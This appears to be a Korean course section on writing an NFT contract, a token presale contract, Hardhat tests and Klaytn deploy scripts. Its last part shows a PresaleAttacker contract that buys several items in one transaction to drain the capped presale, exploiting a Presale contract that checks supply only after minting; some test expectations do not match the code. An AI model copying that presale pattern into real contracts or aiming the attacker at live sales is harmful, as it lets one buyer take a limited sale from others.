# **Section 9 - Presale - Contract** :rocket:

# NewMonkey Contract 만들기

- /contracts/NewMonkey.sol 파일 추가

- NewMonkey.sol 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```solidity
        //SPDX-License-Identifier: MIT

        pragma solidity 0.8.17;

        import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
        import "hardhat/console.sol";

        import "@openzeppelin/contracts/access/Ownable.sol";
        import "@openzeppelin/contracts/access/AccessControl.sol";
        import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

        import "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";
        import "@openzeppelin/contracts/utils/Counters.sol";
        import "@openzeppelin/contracts/utils/Strings.sol";
        import "@openzeppelin/contracts/utils/Base64.sol";

        contract NewMonkey is Ownable, ERC721Enumerable, ERC721URIStorage, AccessControl {
            using Strings for uint256;
            using Counters for Counters.Counter;
            Counters.Counter private _tokenIds;

            mapping(uint256 => uint256) public tokenIdToLevels;
            mapping(uint256 => string) public tokenIdToNames;

            bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

            constructor(string memory name, string memory symbol) ERC721(name, symbol) {
                _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
                _setupRole(MINTER_ROLE, msg.sender);
            }

            function getLevels(uint256 tokenId) public view returns (string memory) {
                uint256 levels = tokenIdToLevels[tokenId];
                return levels.toString();
            }

            function generateCharacter(uint256 tokenId) public view returns (string memory) {
                bytes memory svg = abi.encodePacked(
                    '<svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMinYMin meet" viewBox="0 0 350 350">',
                    "<style>.base { fill: white; font-family: serif; font-size: 14px; }</style>",
                    '<rect width="100%" height="100%" fill="black" />',
                    '<text x="50%" y="40%" class="base" dominant-baseline="middle" text-anchor="middle">',
                    tokenIdToNames[tokenId],
                    "</text>",
                    '<text x="50%" y="50%" class="base" dominant-baseline="middle" text-anchor="middle">',
                    "Level: ",
                    getLevels(tokenId),
                    "</text>",
                    "</svg>"
                );
                return string(abi.encodePacked("data:image/svg+xml;base64,", Base64.encode(svg)));
            }

            function getTokenURI(uint256 tokenId) public view returns (string memory) {
                bytes memory dataURI = abi.encodePacked(
                    "{",
                    '"name": "Monkey #',
                    tokenId.toString(),
                    '",',
                    '"description": "Monkey created by Mo Young Chul",',
                    '"image": "',
                    generateCharacter(tokenId),
                    '",',
                    '"attributes": [{"trait_type": "Level", "value": ',
                    tokenIdToLevels[tokenId].toString(),
                    " }] ",
                    "}"
                );
                return string(abi.encodePacked("data:application/json;base64,", Base64.encode(dataURI)));
            }

            function mint(address account, string memory name) external {
                require(hasRole(MINTER_ROLE, msg.sender), "Caller is not a minter");

                _tokenIds.increment();
                uint256 tokenId = _tokenIds.current();
                _safeMint(account, tokenId);
                tokenIdToLevels[tokenId] = 1;
                tokenIdToNames[tokenId] = name;
                _setTokenURI(tokenId, getTokenURI(tokenId));
            }

            function train(uint256 tokenId) public {
                require(block.number % 2 == 0, "fail train");
                require(_exists(tokenId), "Please use an existing token");
                require(ownerOf(tokenId) == msg.sender, "You must own this token to train it");
                tokenIdToLevels[tokenId] += 1;
                _setTokenURI(tokenId, getTokenURI(tokenId));
            }

            function _beforeTokenTransfer(
                address from,
                address to,
                uint256 firstTokenId,
                uint256 batchSize
            ) internal virtual override(ERC721, ERC721Enumerable) {
                super._beforeTokenTransfer(from, to, firstTokenId, batchSize);
            }

            function supportsInterface(
                bytes4 interfaceId
            ) public view virtual override(ERC721, ERC721Enumerable, AccessControl) returns (bool) {
                return ERC721Enumerable.supportsInterface(interfaceId) || AccessControl.supportsInterface(interfaceId);
            }

            function _burn(uint256 tokenId) internal virtual override(ERC721, ERC721URIStorage) {
                super._burn(tokenId);
            }

            function tokenURI(uint256 tokenId) public view virtual override(ERC721, ERC721URIStorage) returns (string memory) {
                return super.tokenURI(tokenId);
            }
        }


        ```
    
    </details>

- Typechain 만들기
    ```
    npx hardhat typechain
    ```

# NewMonkey NFT UnitTest 만들기

- /test/NewMonkey.test.ts 파일 추가

- NewMonkey.test.ts 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import { expect } from 'chai';
        import { BigNumber } from 'ethers';
        import { ethers, waffle } from 'hardhat';
        import NewMonkeyArtifact from '../artifacts/contracts/NewMonkey.sol/NewMonkey.json';
        import { NewMonkey } from '../typechain';

        describe('NewMonkey', () => {
        let newMonkey: NewMonkey;

        const [admin, other0, other1, other2, receiver] =
            waffle.provider.getWallets();

        before(async () => {});

        beforeEach(async () => {
            newMonkey = (await waffle.deployContract(admin, NewMonkeyArtifact, [
            'NewMonkey',
            'NMon',
            ])) as NewMonkey;
        });

        it('mint', async () => {
            await newMonkey.mint(admin.address, 'brown');
            await newMonkey.mint(admin.address, 'james');
            const balance = await newMonkey.balanceOf(admin.address);
            expect(balance).to.be.equal(BigNumber.from(2));
            const totalSupply = await newMonkey.totalSupply();
            expect(totalSupply).to.be.equal(BigNumber.from(2));

            await expect(
            newMonkey.connect(other0).mint(other0.address, 'brown'),
            ).to.revertedWith('Ownable: caller is not the owner');
        });

        it('train', async () => {
            await newMonkey.mint(admin.address, 'brown');
            const level = await newMonkey.getLevels(1);
            expect(level).to.be.equal(BigNumber.from(1));

            const blockNumber = await ethers.provider.getBlockNumber();
            if (blockNumber % 2 == 0) {
            await ethers.provider.send('evm_mine', []);
            }
            await newMonkey.train(1);

            await expect(newMonkey.train(1)).to.revertedWith('fail train');

            const afterLevel = await newMonkey.getLevels(1);
            expect(afterLevel).to.be.equal(BigNumber.from(2));
        });
        });

        ```
    
    </details>

- Unit Test 실행
    ```
    npx hardhat test .\test\NewMonkey.test.ts
    ```

# Deploy NewMonkey NFT to Klaytn

- /src/new-monkey 폴더 추가

- /src/new-monkey/deploy.ts 파일추가
 
- deploy.ts 스크립트 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import hre, { ethers } from 'hardhat';
        import NewMonkeyArtifact from '../../artifacts/contracts/NewMonkey.sol/NewMonkey.json';
        import { getGasOption } from '../utils/gas';
        import * as fs from 'fs';

        async function main() {
        const [admin] = await hre.ethers.getSigners();

        const chainId = hre.network.config.chainId || 0;

        const factory = await ethers.getContractFactory(
            NewMonkeyArtifact.contractName,
        );
        const contract = await factory.deploy(
            'NewMonkey',
            'NMon',
            getGasOption(chainId),
        );
        const receipt = await contract.deployTransaction.wait();

        const deployedContract = {
            address: contract.address,
            blockNumber: receipt.blockNumber,
            chainId: hre.network.config.chainId,
            abi: NewMonkeyArtifact.abi,
        };

        const filename = __dirname + `/new-monkey.deployed.json`;

        const deployedContractJson = JSON.stringify(deployedContract, null, 2);
        fs.writeFileSync(filename, deployedContractJson, {
            flag: 'w',
            encoding: 'utf8',
        });

        console.log(deployedContractJson);
        }

        main()
        .then(() => process.exit(0))
        .catch(error => {
            console.error(error);
            process.exit(1);
        });


        ```
    
    </details>

- deploy.ts 실행
    
    ```
    npx hardhat run --network baobab .\src\new-monkey\deploy.ts
    ```

# Mint NewMonkey NFT

- /src/new-monkey/mint.ts 파일추가
 
- mint.ts 스크립트 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import hre, { ethers } from 'hardhat';
        import { getGasOption } from '../utils/gas';
        import * as fs from 'fs';
        import { NewMonkey } from '../../typechain';

        async function main() {
        const [admin] = await hre.ethers.getSigners();

        const chainId = hre.network.config.chainId || 0;

        const deployedContractJson = fs.readFileSync(
            __dirname + '/new-monkey.deployed.json',
            'utf-8',
        );
        const deployedContract = JSON.parse(deployedContractJson);
        const newMonkey = (await ethers.getContractAt(
            deployedContract.abi,
            deployedContract.address,
        )) as NewMonkey;

        const transaction = await newMonkey.mint(
            admin.address,
            'brown',
            getGasOption(chainId),
        );
        await transaction.wait();
        }

        main()
        .then(() => process.exit(0))
        .catch(error => {
            console.error(error);
            process.exit(1);
        });


        ```
    
    </details>

- mint.ts 실행
    
    ```
    npx hardhat run --network baobab .\src\new-monkey\mint.ts
    ```

# NewMonkey NFT Train

- /src/new-monkey/train.ts 파일 추가

- train.ts 스크립트 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import hre, { ethers } from 'hardhat';
        import { getGasOption } from '../utils/gas';
        import * as fs from 'fs';
        import { NewMonkey } from '../../typechain';

        async function main() {
        const [admin] = await hre.ethers.getSigners();

        const chainId = hre.network.config.chainId || 0;

        const deployedContractJson = fs.readFileSync(
            __dirname + '/new-monkey.deployed.json',
            'utf-8',
        );
        const deployedContract = JSON.parse(deployedContractJson);
        const newMonkey = (await ethers.getContractAt(
            deployedContract.abi,
            deployedContract.address,
        )) as NewMonkey;

        const transaction = await newMonkey.train(1, getGasOption(chainId));
        await transaction.wait();
        }

        main()
        .then(() => process.exit(0))
        .catch(error => {
            console.error(error);
            process.exit(1);
        });


        ```
    
    </details>

- train.ts 실행 - 트랜잭션 성공과 실패 두가지 경우 모두 발생시키기

    ```
    npx hardhat run --network baobab .\src\new-monkey\train.ts
    ```

//////////////////////////////////////////////////


# Presale Contract 만들기

- /contracts/Presale.sol 파일 추가

- Presale.sol 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```solidity
        //SPDX-License-Identifier: MIT

        pragma solidity 0.8.17;

        import "@openzeppelin/contracts/access/Ownable.sol";
        import "./NewMonkey.sol";
        import "./Momo.sol";

        contract Presale is Ownable {
            NewMonkey public newMonkey;
            Momo public momo;

            constructor(NewMonkey _newMonkey, Momo _momo) {
                newMonkey = _newMonkey;
                momo = _momo;
            }

            function buy(string memory name) public {
                newMonkey.mint(msg.sender, name);
                require(newMonkey.totalSupply() <= 5, "Presale is over");
                momo.transferFrom(msg.sender, owner(), 1 ether);
            }
        }

        ```
    
    </details>

- Typechain 만들기
    ```
    npx hardhat typechain
    ```

# Presale NFT UnitTest 만들기

- /test/Presale.test.ts 파일 추가

- Presale.test.ts 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import { expect } from 'chai';
        import { BigNumber } from 'ethers';
        import { ethers, waffle } from 'hardhat';
        import PresaleArtifact from '../artifacts/contracts/Presale.sol/Presale.json';
        import { Presale } from '../typechain';
        import NewMonkeyArtifact from '../artifacts/contracts/NewMonkey.sol/NewMonkey.json';
        import { NewMonkey } from '../typechain';
        import MomoArtifact from '../artifacts/contracts/Momo.sol/Momo.json';
        import { Momo } from '../typechain';

        describe('NewMonkey', () => {
        let momo: Momo;
        let newMonkey: NewMonkey;
        let presale: Presale;

        const initial = ethers.utils.parseUnits('1000000000', 'ether');

        const [admin, other0, other1, other2, receiver] =
            waffle.provider.getWallets();

        before(async () => {});

        beforeEach(async () => {
            momo = (await waffle.deployContract(admin, MomoArtifact, [
            'Momo',
            'Mom',
            initial,
            ])) as Momo;

            newMonkey = (await waffle.deployContract(admin, NewMonkeyArtifact, [
            'NewMonkey',
            'NMon',
            ])) as NewMonkey;

            presale = (await waffle.deployContract(admin, PresaleArtifact, [
            newMonkey.address,
            momo.address,
            ])) as Presale;
        });

        it('test buy', async () => {
            expect(await newMonkey.owner()).to.be.equal(admin.address);

            expect(
            await newMonkey.hasRole(await newMonkey.MINTER_ROLE(), admin.address),
            ).to.be.equal(true);

            const MAX_UINT256: BigNumber = BigNumber.from(
            '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
            );

            await momo.approve(presale.address, MAX_UINT256);

            await expect(presale.buy('brown')).to.revertedWith(
            'Caller is not a minter',
            );

            await newMonkey.grantRole(await newMonkey.MINTER_ROLE(), presale.address);

            await presale.buy('brown');

            const tokenOwner = await newMonkey.ownerOf(1);

            expect(tokenOwner).to.be.equal(admin.address);
        });

        it('presale over', async () => {
            const MAX_UINT256: BigNumber = BigNumber.from(
            '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
            );

            await momo.approve(presale.address, MAX_UINT256);

            await newMonkey.grantRole(await newMonkey.MINTER_ROLE(), presale.address);

            await presale.buy('brown');
            await presale.buy('brown');
            await presale.buy('brown');
            await presale.buy('brown');
            await presale.buy('brown');

            await expect(presale.buy('brown')).to.revertedWith('Presale is over');
        });
        });


        ```
    
    </details>

- Unit Test 실행
    ```
    npx hardhat test .\test\Presale.test.ts
    ```

# Deploy Presale NFT to Klaytn

- /src/presale 폴더 추가

- /src/presale/deploy.ts 파일추가
 
- deploy.ts 스크립트 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import hre, { ethers } from 'hardhat';
        import PresaleArtifact from '../../artifacts/contracts/Presale.sol/Presale.json';
        import { getGasOption } from '../utils/gas';
        import * as fs from 'fs';
        import { Momo, NewMonkey } from '../../typechain';
        import { BigNumber } from '@ethersproject/bignumber';

        async function main() {
        const [admin] = await hre.ethers.getSigners();

        const chainId = hre.network.config.chainId || 0;

        let deployedContractJson = fs.readFileSync(
            __dirname + '/../new-monkey/new-monkey.deployed.json',
            'utf-8',
        );
        const newMonkeyDeployedContract = JSON.parse(deployedContractJson);

        deployedContractJson = fs.readFileSync(
            __dirname + '/../momo/momo.deployed.json',
            'utf-8',
        );
        const momoDeployedContract = JSON.parse(deployedContractJson);

        const factory = await ethers.getContractFactory(PresaleArtifact.contractName);
        const contract = await factory.deploy(
            newMonkeyDeployedContract.address,
            momoDeployedContract.address,
            getGasOption(chainId),
        );

        const receipt = await contract.deployTransaction.wait();

        const newMonkey = (await ethers.getContractAt(
            newMonkeyDeployedContract.abi,
            newMonkeyDeployedContract.address,
        )) as NewMonkey;

        const receipt2 = await newMonkey.grantRole(
            await newMonkey.MINTER_ROLE(),
            contract.address,
        );
        await receipt2.wait();

        const momo = (await ethers.getContractAt(
            momoDeployedContract.abi,
            momoDeployedContract.address,
        )) as Momo;

        const MAX_UINT256: BigNumber = BigNumber.from(
            '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
        );

        const receipt3 = await momo.approve(contract.address, MAX_UINT256);
        await receipt3.wait();

        const deployedContract = {
            address: contract.address,
            blockNumber: receipt.blockNumber,
            chainId: hre.network.config.chainId,
            abi: PresaleArtifact.abi,
        };

        const filename = __dirname + `/presale.deployed.json`;

        deployedContractJson = JSON.stringify(deployedContract, null, 2);
        fs.writeFileSync(filename, deployedContractJson, {
            flag: 'w',
            encoding: 'utf8',
        });

        console.log(deployedContractJson);
        }

        main()
        .then(() => process.exit(0))
        .catch(error => {
            console.error(error);
            process.exit(1);
        });


        ```

- deploy.ts 실행
    
    ```
    npx hardhat run --network baobab .\src\presale\deploy.ts
    ```

# EstimateGas for Presale

- /src/presale/estimateGas.ts 파일추가
 
- estimateGas.ts 스크립트 만들기

    - <details><summary>⌨️ Source Code</summary>
    
        ```ts
        import hre, { ethers } from 'hardhat';
        import PresaleArtifact from '../../artifacts/contracts/Presale.sol/Presale.json';
        import { getGasOption } from '../utils/gas';
        import * as fs from 'fs';
        import { Presale } from '../../typechain';

        async function main() {
        const [admin] = await hre.ethers.getSigners();

        const chainId = hre.network.config.chainId || 0;

        const deployedContractJson = fs.readFileSync(
            __dirname + '/presale.deployed.json',
            'utf-8',
        );
        const deployedContract = JSON.parse(deployedContractJson);
        const presale = (await ethers.getContractAt(
            deployedContract.abi,
            deployedContract.address,
        )) as Presale;

        const estimateGas = await presale.estimateGas.buy('front');
        console.log(estimateGas.toString());
        }

        main()
        .then(() => process.exit(0))
        .catch(error => {
            console.error(error);
            process.exit(1);
        });


        ```
        
- deploy.ts 실행
    
    ```
    npx hardhat run --network baobab .\src\presale\estimateGas.ts
    ```

# Presale Attacker

- Contract /contracts/PresaleAttacker.sol

    ```solidity
    //SPDX-License-Identifier: MIT

    pragma solidity 0.8.17;

    import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
    import "./Presale.sol";
    import "./Momo.sol";

    contract PresaleAttacker is IERC721Receiver {
        Presale public presale;
        Momo public momo;

        constructor(Presale _presale, Momo _momo) {
            presale = _presale;
            momo = _momo;
            momo.approve(address(presale), type(uint256).max);
        }

        function attack() public {
            presale.buy("aaa");
            presale.buy("aaa");
            presale.buy("aaa");
        }

        function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
            return this.onERC721Received.selector;
        }
    }
    ```

- Unit Test /test/PresaleAttacker.test.ts

    ```ts
    import { expect } from 'chai';
    import { BigNumber } from 'ethers';
    import { ethers, waffle } from 'hardhat';
    import PresaleArtifact from '../artifacts/contracts/Presale.sol/Presale.json';
    import { Presale } from '../typechain';
    import PresaleAttackerArtifact from '../artifacts/contracts/PresaleAttacker.sol/PresaleAttacker.json';
    import { PresaleAttacker } from '../typechain';
    import NewMonkeyArtifact from '../artifacts/contracts/NewMonkey.sol/NewMonkey.json';
    import { NewMonkey } from '../typechain';
    import MomoArtifact from '../artifacts/contracts/Momo.sol/Momo.json';
    import { Momo } from '../typechain';

    describe('NewMonkey', () => {
    let momo: Momo;
    let newMonkey: NewMonkey;
    let presale: Presale;
    let presaleAttacker: PresaleAttacker;

    const initial = ethers.utils.parseUnits('1000000000', 'ether');

    const [admin, other0, other1, other2, receiver] =
        waffle.provider.getWallets();

    before(async () => {});

    beforeEach(async () => {
        momo = (await waffle.deployContract(admin, MomoArtifact, [
        'Momo',
        'Mom',
        initial,
        ])) as Momo;

        newMonkey = (await waffle.deployContract(admin, NewMonkeyArtifact, [
        'NewMonkey',
        'NMon',
        ])) as NewMonkey;

        presale = (await waffle.deployContract(admin, PresaleArtifact, [
        newMonkey.address,
        momo.address,
        ])) as Presale;

        presaleAttacker = (await waffle.deployContract(
        admin,
        PresaleAttackerArtifact,
        [presale.address, momo.address],
        )) as PresaleAttacker;

        await newMonkey.grantRole(await newMonkey.MINTER_ROLE(), presale.address);

        await momo.transfer(
        presaleAttacker.address,
        BigNumber.from(10).pow(18).mul(100000),
        );
    });

    it('attack', async () => {
        await presaleAttacker.attack();
        await expect(presaleAttacker.attack()).to.revertedWith('Presale is over');
    });
    });
    ```